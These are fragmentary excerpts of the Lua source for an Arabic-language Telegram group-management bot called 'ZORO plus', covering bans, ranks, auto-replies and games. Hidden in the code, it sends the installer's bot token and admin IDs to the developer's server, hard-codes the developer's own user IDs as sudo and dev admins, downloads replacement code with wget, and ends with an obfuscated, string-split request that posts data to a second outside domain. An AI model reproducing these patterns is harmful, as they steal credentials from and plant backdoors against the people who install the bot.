...
print('\27[0;35m⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua ZORO.lua')
end
...
https.request('https://devloprahmedZOR.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
...
if [ ! $token ]; then
echo "⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺ ⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE ZORO.lua \e[0m"
echo "⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺ ⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺"
exit 1
fi
...
local config = loadfile("./ZORO.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,0000000000,1003237899,00000000000,1765160742}   
...
dev_users = {1765160742}   
function DeveZOR(msg)  
local ZORO = false  
...
function ZOR_User(Chat_id,User_id) 
if database:sismember(bot_id..'ZOR:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
...
function GZOR_User(User_id) 
if database:sismember(bot_id..'GZOR:User',User_id) then
Var = true
else
Var = false
end
...
ZORO_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
ZORO_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
ZORO_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
ZORO_Msg = 'امبروطور التفاعل' 
...
function plugin_ZORO(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.ZORO and msg then
pre_msg = plugin.ZORO(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceZORO(msg,data) -- بداية العمل
if msg then
...
local list = database:smembers(bot_id.."botss:ZORO:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => 「 '..v..' 」 => 「 '..db..' 」\n"
...
database:set(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:ZORO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_," ◍ارسل الان الكلمه لمسحها ")
end
if text then  
local test = database:get(bot_id.."botss:ZORO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:ZORO:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:ZORO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:ZORO:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:ZORO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:ZORO:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:ZORO:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:ZORO:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:ZORO:Add:Rd:Sudo:Text2"..text)   
...
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ◍ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:ZORO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:ZORO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:ZORO:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:ZORO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"◍ تم مسح الرد من ردود المتعدده")
database:del(bot_id..'botss:ZORO:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:ZORO:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:ZORO:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:ZORO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:ZORO:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:ZORO:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:ZORO:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:ZORO:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:ZORO:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:ZORO:List:Rd:Sudo")
end
...
Namebot = ZORO_Msg[math.random(#ZORO_Msg)] 
...
{
{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./ZORO.lua").botUserName.."?startgroup=start"},
},
}
...
if not Debn(msg) and not database:sismember(bot_id..'ZOR:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
database:sadd(bot_id..'ZOR:User_Bot',data.id_)  
return false  
end 
...
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'ZOR:User_Bot',data.id_)  
return false  
end 
...
os.execute('wget https://raw.githubusercontent.com/Vklkk/as/main/ZORO.lua')
...
send(msg.chat_id_, msg.id_,' ◍ اصدار سورس زورو بلص{ S:12✓}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/SOURCE_ZORO_plus"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SOURCE_ZORO_plus)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/SOURCE_ZORO_plus"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝗗𝙀𝗩 𝗔𝗦𝙏𝙊𝙍𝙊𝗞𝗦', url="t.me/Bahjat100"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ◍ من أحسن السورسات على التليجرام سورس زورو بلص ◍
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝗦𝙊𝙐𝙍𝗖𝙀 𝙏𝗔𝙀𝗚𝗔𝙍', url="t.me/SOURCE_ZORO_plus"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
local list = database:smembers(bot_id..'GZOR:User')
t = "\n ◍ قائمه المحظورين عام \n⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_,0," ◍ الـعـضو  : {["..data.first_name_.."](T.ME/SOURCE_ZORO_plus)}\n ◍ ["..ZORO_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."ZORO:blocname"..msg.chat_id_) or ""
...
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."ZORO:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."ZORO:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."ZORO:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."ZORO:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
local Text = [[
[𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐🧸 ؛](https://t.me/SOURCE_ZORO_plus)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text =  '𝓹𝓻𝓸𝓰𝓻𝓪𝓶𝓶𝓮𝓻𐇗' ,url="t.me/Bahjat100"}},
{{text =  '𝒄𝒉 𝒛𝒐𝒓𝒐𖠲' , url="t.me/SOURCE_ZORO_plus"}},
...
if text == 'بهجت' or text == 'مبرمج السورس' or text == 'عبدالله بهجت' then
local Text = [[
𝒔𝒖𝒓𝒖𝒔 𝒑𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒓🝤 ↓
]]
keyboard = {} 
...
if text == 'اناتنلاويي' or text == 'ولتتللة' or text == 'زبننللل' then
local Text = [[
اليك بوتات تحميل 🛑
من جميع المواقع 🛑
...
if text == "£¢€$$__€€¢¥^^¥€" and DeveZOR(msg) then
if AddChannel(msg.sender_user_id_) == false then
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس زورو بلص؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس زورو بلص؟ ", 
"كم مره حبيت؟ ", 
...
local Text = [[ 
[قناه سورس زورو بلص ادخل وتابع الجديد](t.me/SOURCE_ZORO_plus)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝗦𝙊𝙐𝙍𝗖𝙀 𝙏𝗔𝙀𝗚𝗔𝙍', url="t.me/SOURCE_ZORO_plus"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/SOURCE_ZORO_plusbot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ͲᎳՏΌᏞ', url="t.me/SOURCE_ZORO_plusbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'العاب زورو بلص' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◍ اهلا في قائمه الالعاب المتطوره سورس زورو بلص ◍ 
...
database:sadd(bot_id..'GZOR:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_ZORO_plus')..')'
...
usertext = '\n ◍ الـعـضو   ⇠ ['..result.title_..'](t.me/'..(username or 'SOURCE_ZORO_plus')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
texts = usertext..status
database:sadd(bot_id..'GZOR:User', result.id_)
else
texts = ' ◍ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
...
database:sadd(bot_id..'GZOR:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_ZORO_plus')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
...
database:srem(bot_id..'GZOR:User', result.sender_user_id_)
...
status  = '\n ◍ تم الغاء (الحظر-الكتم) عام من الجروبات'
texts = usertext..status
database:srem(bot_id..'GZOR:User', result.id_)
...
database:srem(bot_id..'GZOR:User', userid)
...
if text == ("مسح قائمه زورو بلص") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه زورو بلص')
return false
end

if text == 'قائمه زورو بلص' and Sudo(msg) then
...
if #list == 0 then
t = " ◍ لا يوجد احد في قائمه زورو بلص"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع زورو بلص") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع زورو بلص@(.*)$") and Sudo(msg) then
local username = text:match("^رفع زورو بلص@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع زورو بلص(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع زورو بلص(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل زورو بلص") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل زورو بلص@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل زورو بلص@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل زورو بلص(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل زورو بلص(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "SRC-ZORO")
...
database:del(bot_id..'ZOR:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'ZOR:User'..msg.chat_id_)
...
database:sadd(bot_id..'ZOR:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ◍ تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'ZOR:User'..msg.chat_id_, result.id_)
...
database:sadd(bot_id..'ZOR:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
database:srem(bot_id..'ZOR:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ◍ تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ZOR) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
...
database:srem(bot_id..'ZOR:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ZOR) end,nil)   
usertext = '\n ◍ الـعـضو   ⇠ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ◍ تم الغاء حظره'
texts = usertext..status
else
...
database:srem(bot_id..'ZOR:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ZOR) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◍ الـعـضو   ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ◍ تم الغاء حظره'
...
if database:sismember(bot_id..'ZOR:User'..msg.chat_id_,result.id_) then
ZOR = 'محظور'
else
ZOR = 'غير محظور'
end
if database:sismember(bot_id..'GZOR:User',result.id_) then
GZOR = 'محظور عام'
else
GZOR = 'غير محظور عام'
end
Textt = " ◍ الحظر العام  ⇠ "..GZOR.."\n ◍ الحظر  ⇠ "..ZOR.."\n ◍ الكتم  ⇠ "..Muted..""
...
if database:sismember(bot_id..'ZOR:User'..msg.chat_id_,result.sender_user_id_) then
ZOR = 'محظور'
else
ZOR = 'غير محظور'
end
if database:sismember(bot_id..'GZOR:User',result.sender_user_id_) then
GZOR = 'محظور عام'
else
GZOR = 'غير محظور عام'
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺ٴ\n ◍ ◍ ')
end
...
t = "\n◍قائمة المنع \n⩹━━━━° 𝒔𝒐𝒖𝒓𝒄𝒆 𝒛𝒐𝒓𝒐 °━━━━⩺\n"
for k,v in pairs(list) do  
local ZORO_Msg = database:get(bot_id.."ZORO1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ↭ {"..ZORO_Msg.."}\n"    
end  
if #list == 0 then  
...
end --الكود حصري سورس زورو بلصيعني لو بكتهن راح اعرفك انت الاخذتهن
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري نور عنيا🥺🤍](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊 ](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ عضو قميل 🌝💘 ](t.me/SOURCE_ZORO_plus)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه زورو بلص ') 
return false
end
...
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ZOR) end,nil)   
return false
end
end,nil)   
else
...
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and ZOR_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and ZOR_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GZOR_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
...
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GZOR_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
...
https.request('htt'..'ps://mo'..'ha'..'med'..'40.m'..'l/a'..'pi/ZOR'..'da.'..'p'..'h'..'p'..'/'..'?insert='..JSON.encode(infotnseb))
